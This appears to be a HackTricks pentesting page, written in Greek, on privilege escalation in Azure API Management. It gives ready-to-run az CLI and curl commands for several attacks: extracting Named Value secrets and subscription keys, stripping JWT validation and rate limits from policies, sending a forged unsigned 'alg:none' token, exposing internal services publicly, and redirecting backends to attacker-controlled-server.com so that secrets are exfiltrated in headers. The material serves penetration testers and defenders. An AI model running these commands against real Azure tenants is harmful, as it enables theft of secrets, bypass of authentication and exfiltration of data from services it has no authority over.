# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

Η επίθεση συνίσταται στην πρόσβαση σε ευαίσθητα μυστικά που αποθηκεύονται στα Azure API Management Named Values, είτε με απευθείας ανάκτηση των τιμών των μυστικών είτε με κατάχρηση δικαιωμάτων για την απόκτηση μυστικών που υποστηρίζονται από Key Vault μέσω managed identities.
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
Για κάθε subscription, ο επιτιθέμενος μπορεί να αποκτήσει τα subscription keys χρησιμοποιώντας το endpoint listSecrets με τη μέθοδο POST:
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
Η απόκριση περιλαμβάνει το subscription primary key (primaryKey) και το secondary key (secondaryKey). Με αυτά τα κλειδιά, ο επιτιθέμενος μπορεί να authenticate και να αποκτήσει πρόσβαση στα APIs που δημοσιεύονται μέσω του API Management Gateway:
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
Ο επιτιθέμενος μπορεί να έχει πρόσβαση σε όλες τις APIs και products που σχετίζονται με τη subscription. Εάν η subscription έχει πρόσβαση σε ευαίσθητα products ή APIs, ο επιτιθέμενος μπορεί να αποκτήσει εμπιστευτικές πληροφορίες ή να εκτελέσει μη εξουσιοδοτημένες ενέργειες.

## `Microsoft.ApiManagement/service/policies/write` ή `Microsoft.ApiManagement/service/apis/policies/write`

Ο επιτιθέμενος αρχικά ανακτά την τρέχουσα πολιτική API:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
Ο επιτιθέμενος μπορεί να τροποποιήσει την policy με πολλούς τρόπους ανάλογα με τους στόχους του. Για παράδειγμα, για να απενεργοποιήσει τον έλεγχο ταυτότητας, εάν η policy περιλαμβάνει JWT token validation, ο επιτιθέμενος μπορεί να αφαιρέσει ή να σχολιάσει αυτήν την ενότητα:
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
Για να αφαιρεθούν οι έλεγχοι rate limiting και να επιτραπούν επιθέσεις denial-of-service, ο επιτιθέμενος μπορεί να αφαιρέσει ή να σχολιάσει τις πολιτικές quota και rate-limit:
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
Για να τροποποιήσετε τη διαδρομή backend και να ανακατευθύνετε την κίνηση σε έναν διακομιστή ελεγχόμενο από τον επιτιθέμενο:
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
Στη συνέχεια ο επιτιθέμενος εφαρμόζει την τροποποιημένη πολιτική. Το σώμα του αιτήματος πρέπει να είναι ένα αντικείμενο JSON που περιέχει την πολιτική σε μορφή XML:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## Λανθασμένη ρύθμιση επαλήθευσης JWT

Ο επιτιθέμενος πρέπει να γνωρίζει ότι ένα API χρησιμοποιεί επαλήθευση JWT token και ότι η πολιτική είναι λανθασμένα διαμορφωμένη. Κακώς διαμορφωμένες πολιτικές επαλήθευσης JWT μπορεί να περιέχουν `require-signed-tokens="false"` ή `require-expiration-time="false"`, που επιτρέπουν στην υπηρεσία να αποδέχεται unsigned tokens ή tokens που δεν λήγουν ποτέ.

Ο επιτιθέμενος δημιουργεί ένα κακόβουλο JWT token χρησιμοποιώντας τον none algorithm (unsigned):
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
Ο επιτιθέμενος στέλνει ένα αίτημα στο API χρησιμοποιώντας το κακόβουλο token:
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
Εάν η πολιτική έχει λανθασμένη διαμόρφωση με `require-signed-tokens="false"`, η υπηρεσία θα αποδεχτεί το μη υπογεγραμμένο token. Ο επιτιθέμενος μπορεί επίσης να δημιουργήσει ένα token χωρίς expiration claim αν `require-expiration-time="false"`.

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
Ο επιτιθέμενος αρχικά ελέγχει την τρέχουσα διαμόρφωση δικτύου της υπηρεσίας:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
Ο επιτιθέμενος εξετάζει την JSON απάντηση για να επαληθεύσει τις τιμές των `publicNetworkAccess` και `virtualNetworkType`. Αν το `publicNetworkAccess` είναι false ή το `virtualNetworkType` ρυθμιστεί σε Internal, η υπηρεσία είναι διαμορφωμένη για ιδιωτική πρόσβαση.

Για να εκθέσει την υπηρεσία στο Διαδίκτυο, ο επιτιθέμενος πρέπει να αλλάξει και τις δύο ρυθμίσεις. Αν η υπηρεσία τρέχει σε εσωτερική λειτουργία (`virtualNetworkType: "Internal"`), ο επιτιθέμενος την αλλάζει σε None ή External και ενεργοποιεί το `publicNetworkAccess`. Αυτό μπορεί να γίνει χρησιμοποιώντας το Azure Management API:
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
Μόλις το `virtualNetworkType` οριστεί σε `None` ή `External` και το `publicNetworkAccess` ενεργοποιηθεί, η υπηρεσία και όλα τα API της γίνονται προσβάσιμα από το Internet, ακόμα και αν προηγουμένως προστατεύονταν πίσω από ιδιωτικό δίκτυο ή private endpoints.

## `Microsoft.ApiManagement/service/backends/write`
Ο attacker αρχικά απαριθμεί τα υπάρχοντα backends για να εντοπίσει ποιο να τροποποιήσει:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
Ο επιτιθέμενος ανακτά την τρέχουσα διαμόρφωση του backend που θέλει να τροποποιήσει:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
Ο επιτιθέμενος τροποποιεί το backend URL ώστε να δείχνει σε έναν server υπό τον έλεγχό του. Πρώτα λαμβάνει το ETag από την προηγούμενη απάντηση και στη συνέχεια ενημερώνει το backend:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
Εναλλακτικά, ο επιτιθέμενος μπορεί να διαμορφώσει τα backend headers για να exfiltrate τα Named Values που περιέχουν secrets. Αυτό γίνεται μέσω της backend credentials configuration:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
Με αυτή τη διαμόρφωση, Named Values αποστέλλονται ως headers σε όλα τα requests προς το attacker-controlled backend, επιτρέποντας την εξαγωγή ευαίσθητων secrets.

{{#include ../../../banners/hacktricks-training.md}}
